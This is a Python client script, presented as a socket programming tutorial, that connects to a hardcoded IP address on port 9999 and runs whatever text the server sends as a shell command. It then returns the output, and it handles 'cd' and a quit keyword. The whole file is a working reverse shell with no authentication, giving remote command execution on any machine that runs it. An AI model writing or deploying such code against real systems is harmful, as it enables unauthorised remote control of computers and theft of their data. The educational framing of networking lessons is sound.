#! /usr/bin/python3

'''
client.py

CLIENT

Socket Programming Tutorial

Application to connect to HOSTvia Socket and Controll the shell

NOTE Sockets created using socket.SOCK_STREAM are TCP sockets
                     using socket.SOCK_DGRAM  are UDP sockets


Host - Host IP
Port - Port created to establish socket connection

SERVER
 socket -> bind -> listen -> accept   ^->recv/send v        ^->recv(closing msg) --> close
Client
                   socket -> connect  ^ ->send/rcv v->close ^

'''

import socket

# These are needed to execute instructs the client.py file is going to recevie
import os
import subprocess


def main():
	m_socket = socket.socket()

	# ip address of server
	host = "10.113.137.1" 	
	# host = '192.168.174.128'
	# host = ""
	# port = 65432 # must be same as host
	port = 9999 #Works for Medtronic Network

	# For CLIENT side we need to bind the IP and Port together
	m_socket.connect( (host,port) )

	while True:
		
		# Create a recv buffer for incoming data
		data = m_socket.recv(1024)
		
		# If we actually receive a 'cd' command, we will do an system command
		# handle commands like "cd" or etc..
		# :2 means look at first 2 characters
		# REMEMBER we must decode from bytes to string
		if data[:2].decode("utf-8") == 'qc':

			m_socket.send( str.encode("quiting client side"))
			m_socket.close()
			exit()

		elif data[:2].decode("utf-8") == 'cd':
			# We want the characters after the 'cd '
			os.chdir(data[3:].decode("utf-8"))

		elif len(data) > 0:
			# open a termina window and execute the command
			# 'shell = True' - Gives us access to shell commands (ie dir, cd, ls etc..)
			# for the command 'echo hey'
			# stdoutput = 'hey' the output
			# stdin = 'echo hey' input command
			# stderr = is the error code we might get from a bad command
			# adding these pipes allows us to have access to all this output
			cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, \
																		stdin=subprocess.PIPE, \
																		stderr = subprocess.PIPE)

			output_byte = cmd.stdout.read() + cmd.stderr.read()
			output_str = str(output_byte, "utf-8") # convert from byte to string
			
			# A string to hold the pwd prompt and recreate the prompt- for aesthetics
			currentWD = os.getcwd() + ">"

			# now we need to send this output string to the server *Must convert str back to byte
			m_socket.send(str.encode(output_str + currentWD))

			# Print this on this Client computer as well, so we know what is going on.
			print(output_str)


if __name__ == "__main__":
	main()